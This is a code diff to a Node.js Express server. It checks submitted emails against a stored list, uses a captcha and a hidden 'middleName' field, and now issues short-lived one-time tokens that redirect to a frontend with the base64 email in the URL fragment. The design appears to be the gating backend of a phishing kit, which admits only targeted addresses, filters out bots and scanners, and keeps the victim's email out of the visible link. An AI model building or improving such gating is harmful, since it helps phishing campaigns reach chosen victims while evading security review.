@@ -6,15 +6,16 @@ const fs = require('fs');
 const path = require('path');
 const fetch = require('node-fetch');
 const rateLimit = require('express-rate-limit');
+const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-
-// ✅ The base for redirect links (points to the frontend)
 const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://frontend-production-05bd.up.railway.app';
 
 let validEmails = new Set();
+let tokenMap = new Map();
+
 function loadEmails() {
   try {
     const data = fs.readFileSync(EMAIL_FILE, 'utf8');
@@ -38,6 +39,7 @@ app.use(cors({
 app.use(express.json());
 app.use(limiter);
 
+// API to check email and generate redirect token
 app.post('/api/check-email', async (req, res) => {
   const { email, captchaToken, middleName } = req.body;
 
@@ -73,10 +75,31 @@ app.post('/api/check-email', async (req, res) => {
     return res.status(404).json({ valid: false, message: 'Email not recognized' });
   }
 
-  // ✅ Encode and send redirect URL
- const encoded = Buffer.from(normalizedEmail).toString('base64');
-const redirectUrl = `${REDIRECT_BASE}#${encoded}`;
-return res.json({ valid: true, redirectUrl });
+  const token = crypto.randomBytes(16).toString('hex');
+  const encoded = Buffer.from(normalizedEmail).toString('base64');
+  tokenMap.set(token, { email: encoded, expires: Date.now() + 5 * 60 * 1000 }); // 5 min expiry
+
+  const redirectUrl = `${REDIRECT_BASE}/forward?token=${token}`;
+  return res.json({ valid: true, redirectUrl });
+});
+
+// Redirect handler using temporary token
+app.get('/forward', (req, res) => {
+  const { token } = req.query;
+  const entry = tokenMap.get(token);
+
+  if (!entry) {
+    return res.status(403).send('Invalid or expired token.');
+  }
+
+  if (Date.now() > entry.expires) {
+    tokenMap.delete(token);
+    return res.status(410).send('Token expired.');
+  }
+
+  const redirectUrl = `${REDIRECT_BASE}/#${entry.email}`;
+  tokenMap.delete(token);
+  res.redirect(302, redirectUrl);
 });
 
 app.listen(PORT, () => {
